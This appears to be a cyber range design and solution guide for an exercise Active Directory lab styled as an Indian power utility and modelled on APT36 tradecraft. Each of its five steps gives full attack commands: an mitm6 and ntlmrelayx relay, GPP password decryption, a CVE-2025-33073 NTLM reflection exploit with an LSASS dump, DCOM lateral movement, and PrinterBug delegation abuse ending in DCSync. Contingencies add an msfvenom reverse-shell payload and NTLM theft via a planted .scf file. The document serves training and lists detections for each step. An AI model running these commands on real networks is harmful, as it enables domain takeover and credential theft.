# APT36 Operation PHANTOM RELAY — Active Directory NTLM Relay & Delegation Cyber Range

**Classification:** UNCLASSIFIED // EXERCISE ONLY\
**Domain Theme:** Critical Infrastructure — Indian Power Utility AD Environment (OPERATION GRIDFALL)\
**Network:** corp.prabalurja.in\
**Platform:** Windows Server 2019

---

## Machine Summary

| # | Hostname | Role | Vulnerability | MITRE ATT&CK |
|---|----------|------|---------------|---------------|
| M1 | DC-CORPUL | Domain Controller (AD DS + DNS) | LDAP signing not enforced, Print Spooler running, LDAPS with self-signed cert | T1557, T1003.006 |
| M2 | SRV-PORTAL | IIS Web Portal | IPv6 enabled (mitm6 target), WPAD auto-detect, LLMNR/NBT-NS enabled | T1557.001, T1040 |
| M3 | SRV-NAS | File Server | SYSVOL backup with GPP cpassword, IT-Scripts share with cleartext creds | T1552.006, T1552.001 |
| M4 | SRV-CI | Build/CI Server | CVE-2025-33073 NTLM Reflection (unpatched — no KB5060531), SMB signing disabled | T1557, T1003.001 |
| M5 | SRV-BASTION | Jump/Bastion Server | Unconstrained Delegation, DCOM enabled, Print Spooler running | T1558.001, T1021.003 |

---

## Entry Point

Players arrive from RNG-IT-02 with pre-obtained credentials: `svc-monitor:M0n!tor@PUL24`. This is a read-only domain account used for initial enumeration.

---

## Credential Chain

```
Step 0  Entry        →  svc-monitor : M0n!tor@PUL24  (from RNG-IT-02)
Step 1  mitm6 Relay  →  SRV-PORTAL$ NTLM relayed to DC LDAPS → svc_web GenericAll on svc_file → password reset
Step 2  GPP Decrypt  →  SYSVOLBackup share → Groups.xml cpassword → svc_build : Bu1ld$3rv!c3#2025
Step 3  CVE-2025-33073 →  NTLM reflection on SRV-CI → SYSTEM → LSASS dump → svc_admin hash
Step 4  DCOM Lateral →  svc_admin via MMC20.Application → SRV-BASTION shell
Step 5  PrinterBug   →  Coerce DC-CORPUL → Unconstrained Delegation → DC$ TGT → DCSync
```

---

## Attack Flow (5 Steps)

### Step 1 — mitm6 IPv6 DNS Takeover → NTLM Relay to LDAPS (SRV-PORTAL → DC-CORPUL)

mitm6 poisons IPv6 DNS, becoming the authoritative DNS for the subnet. When SRV-PORTAL makes HTTP requests (WPAD lookups, NCSI checks, or the WebHealthCheck scheduled task), mitm6 intercepts and forces NTLM authentication. ntlmrelayx relays the captured NTLM to DC-CORPUL's LDAPS (port 636). `svc_web` has GenericAll on `svc_file` — the relay session resets svc_file's password via the interactive LDAP shell.

**Tools:** mitm6, ntlmrelayx (with --remove-mic -i flags), nc
**Detection:** DHCPv6 solicitations from attacker MAC. DNS responses for wpad.corp.prabalurja.in from non-DC source. Event 4723/4724 (password change) for svc_file on DC-CORPUL.

```
# Block gateway (VMware NAT interference)
sudo iptables -A INPUT -s GATEWAY_IP -p tcp --dport 80 -j DROP

# Terminal 1: ntlmrelayx targeting LDAPS with interactive shell
ntlmrelayx.py -t ldaps://DC-CORPUL --no-smb-server --no-wcf-server --no-raw-server -6 --remove-mic -i

# Terminal 2: mitm6
sudo mitm6 -d corp.prabalurja.in -i eth0 --ignore-nofqdn

# Terminal 3: Manual trigger from SRV-PORTAL (runas svc_web)
# runas /user:CORPPUL\svc_web cmd
# curl http://monitoring.corp.prabalurja.in/test --ntlm -u : 2>nul

# Terminal 4: Connect to LDAP shell after relay succeeds
nc 127.0.0.1 11000
change_password svc_file N3wF1l3P@ss!2025

# Verify
nxc smb SRV-NAS -u svc_file -p 'N3wF1l3P@ss!2025' -d corp.prabalurja.in --shares
```

**Contingencies:**
- **C1a:** LLMNR/NBT-NS — Responder captures svc_file NTLMv2 hash (LegacyBackupCheck task every 5 min): `sudo responder -I eth0 -wv`
- **C1b:** DropBox writable share — drop .scf file for NTLM theft: `smbclient //SRV-PORTAL/DropBox -N -c "put evil.scf @evil.scf"`
- **C1c:** web.config.bak — svc_file creds in cleartext: `curl -s http://SRV-PORTAL/web.config.bak`

---

### Step 2 — GPP cpassword from SYSVOL Backup Share (SRV-NAS)

Using svc_file credentials from Step 1, the attacker accesses the SYSVOLBackup share on SRV-NAS. Inside the GPO backup structure, a Groups.xml file contains an AES-256-CBC encrypted password (cpassword) for svc_build. The AES key was published by Microsoft in 2014 (MS14-025) — decryption is trivial with `gpp-decrypt`.

**Tools:** smbclient, gpp-decrypt
**Detection:** Event 5140/5145 on SRV-NAS for SYSVOLBackup share access by svc_file.

```
# Access share
smbclient //SRV-NAS/SYSVOLBackup -U 'CORPPUL/svc_file%N3wF1l3P@ss!2025'

# Navigate and download
cd Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups
get Groups.xml

# Decrypt
cat Groups.xml | grep cpassword
gpp-decrypt "CPASSWORD_VALUE"
# Output: Bu1ld$3rv!c3#2025

# Verify
nxc smb DC-CORPUL -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in
```

**Contingencies:**
- **C2b:** IT-Scripts share — deploy.ps1 has svc_build creds in comments: `smbclient //SRV-NAS/IT-Scripts -U 'CORPPUL/svc_file%N3wF1l3P@ss!2025' -c "get deploy.ps1"`

---

### Step 3 — CVE-2025-33073 NTLM Reflection → SYSTEM on SRV-CI

CVE-2025-33073 (June 2025) resurrects NTLM reflection by abusing marshaled target information in DNS records. The PoC tool handles DNS record creation, coercion, and relay automatically. The crafted DNS record tricks SRV-CI's SMB client into performing local authentication, which is relayed back to SRV-CI's own SMB service — bypassing MS08-068. The result is SYSTEM-level access on SRV-CI. LSASS dump reveals svc_admin and svc_dadmin hashes cached from scheduled tasks.

**Prerequisite:** SRV-CI must NOT have KB5060531 installed. SMB signing must be disabled.

**Tools:** CVE-2025-33073.py (from github.com/mverschu/CVE-2025-33073), nxc
**Detection:** DNS A record creation in ADIDNS for unusual hostname. SMB Session Setup from SRV-CI to itself. Event 4624 with SYSTEM-level logon from unexpected source.

```
# Add SRV-CI to /etc/hosts
echo "SRV_CI_IP SRV-CI.corp.prabalurja.in SRV-CI" >> /etc/hosts

# Run CVE-2025-33073 PoC
cd /opt/redteam/tools/CVE-2025-33073
source venv/bin/activate
python3 CVE-2025-33073.py \
    -u 'corp.prabalurja.in\svc_build' \
    -p 'Bu1ld$3rv!c3#2025' \
    --attacker-ip KALI_IP \
    --dns-ip DC_IP \
    --dc-fqdn DC-CORPUL.corp.prabalurja.in \
    --target SRV-CI.corp.prabalurja.in \
    --target-ip SRV_CI_IP

# Dump LSASS for cached creds
nxc smb SRV-CI -u administrator -H LOCAL_ADMIN_HASH --local-auth -M lsassy
# Output: svc_admin NTLM hash + svc_dadmin NTLM hash
```

**Contingencies:**
- **C3a:** AlwaysInstallElevated — login via evil-winrm, MSI payload: `evil-winrm -i SRV-CI -u svc_build -p 'Bu1ld$3rv!c3#2025'` then `msfvenom -p windows/x64/shell_reverse_tcp -f msi -o evil.msi` + `msiexec /quiet /qn /i evil.msi`
- **C3b:** Unquoted service path CorpBuildTools: `wmic service get name,pathname | findstr /v "C:\Windows" | findstr /v "\""`

---

### Step 4 — DCOM Lateral Movement via MMC20.Application (SRV-BASTION)

Using svc_admin's NTLM hash from Step 3, the attacker uses DCOM (Distributed COM) to execute commands on SRV-BASTION via the MMC20.Application COM object. This bypasses SMB/WinRM/PsExec detection rules. svc_admin is local admin on SRV-BASTION.

**Tools:** impacket-dcomexec
**Detection:** DCOM connection on port 135 followed by high-port RPC. No SMB-based lateral movement artifacts. Event 4688 for mmc.exe spawning child processes.

```
# DCOM lateral movement
impacket-dcomexec -object MMC20 'CORPPUL/svc_admin@SRV-BASTION' -hashes :SVC_ADMIN_HASH

# Verify
whoami
hostname

# Confirm Unconstrained Delegation
nxc ldap DC-CORPUL -u svc_admin -H SVC_ADMIN_HASH -d corp.prabalurja.in --trusted-for-delegation

# Verify Print Spooler on DC and SRV-BASTION
sc query Spooler
```

**Contingencies:**
- **C4a:** PSReadline history — svc_dadmin password in svc_admin's PowerShell history: `type C:\Users\svc_admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **C4b:** Cached RDP credentials (DPAPI blobs) in svc_admin's profile
- **C4c:** HealthMonitor scheduled task — writable folder, runs as svc_dadmin: `schtasks /query /tn HealthMonitor /fo LIST /v`

---

### Step 5 — Unconstrained Delegation + PrinterBug → DC TGT Capture → DCSync

SRV-BASTION has Unconstrained Delegation enabled (`TrustedForDelegation=True`). The attacker runs Rubeus in monitor mode to capture incoming TGTs, then triggers the PrinterBug (MS-RPRN) to coerce DC-CORPUL's Print Spooler to authenticate to SRV-BASTION. Because of Unconstrained Delegation, DC-CORPUL's TGT is stored in SRV-BASTION's memory. The attacker extracts the TGT and uses it for DCSync.

**Tools:** Rubeus.exe, printerbug.py/SpoolSample.exe, impacket-secretsdump
**Detection:** Event 4624 on SRV-BASTION from DC-CORPUL$ machine account. Rubeus process execution. Event 4662 on DC-CORPUL (DCSync replication). Print Spooler RPC call from SRV-BASTION to DC-CORPUL.

```
# Upload tools to SRV-BASTION
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
# From DCOM shell:
net use \\KALI_IP\share /user:att att
copy \\KALI_IP\share\Rubeus.exe C:\temp\Rubeus.exe

# Start Rubeus monitor
C:\temp\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC-CORPUL$

# Trigger PrinterBug from Kali
python3 printerbug.py 'corp.prabalurja.in/svc_admin'@DC-CORPUL SRV-BASTION -hashes :SVC_ADMIN_HASH

# Rubeus captures DC-CORPUL$ TGT — copy base64 ticket

# Convert and use from Kali
echo "BASE64_TICKET" | base64 -d > dc_tgt.kirbi
impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
export KRB5CCNAME=dc_tgt.ccache
sudo ntpdate DC_IP
impacket-secretsdump -k -no-pass 'corp.prabalurja.in/DC-CORPUL$@DC-CORPUL.corp.prabalurja.in' -just-dc
```

**Contingencies:**
- **C5a:** svc_admin WriteProperty on Server Operators — add self, logon to DC, dump hashes: `net rpc group addmem "Server Operators" "svc_admin" -U 'CORPPUL/svc_admin%Adm1n$3rv!c3#2025' -S DC-CORPUL`

---

## Setup Order

```
1. M1-DC-CORPUL    — Domain Controller (creates corp.prabalurja.in forest)
2. M2-SRV-PORTAL   — Join domain, install IIS, WPAD trigger, LLMNR
3. M3-SRV-NAS      — Join domain, SYSVOL backup share, GPP Groups.xml
4. M4-SRV-CI       — Join domain, NO UPDATES (CVE-2025-33073), LSASS caching
5. M5-SRV-BASTION  — Join domain, DCOM, Unconstrained Delegation, Spooler
6. M1-DC-CORPUL (again) — Post-join: Unconstrained Delegation, ACLs, GPO
```

## APT36 Technique Mapping

This range models APT36 (Transparent Tribe / KAAL CHAKRA) tradecraft adapted for OPERATION GRIDFALL targeting Indian critical infrastructure. APT36 is attributed to Pakistan's Inter-Services Intelligence (ISI) and has been observed targeting Indian government and energy sector organizations.

| Step | Technique | MITRE ID | APT36 Precedent |
|------|-----------|----------|-----------------|
| 1 | Adversary-in-the-Middle: LLMNR/NBT-NS/mDNS | T1557.001 | Network-based credential interception |
| 2 | Unsecured Credentials: GPP | T1552.006 | Credential harvesting from legacy configurations |
| 3 | Exploitation for Privilege Escalation | T1068 | CVE-2025-33073 — NTLM reflection for SYSTEM access |
| 4 | Remote Services: DCOM | T1021.003 | Lateral movement via distributed COM objects |
| 5 | Steal or Forge Kerberos Tickets | T1558.001 | Unconstrained Delegation abuse for TGT capture |
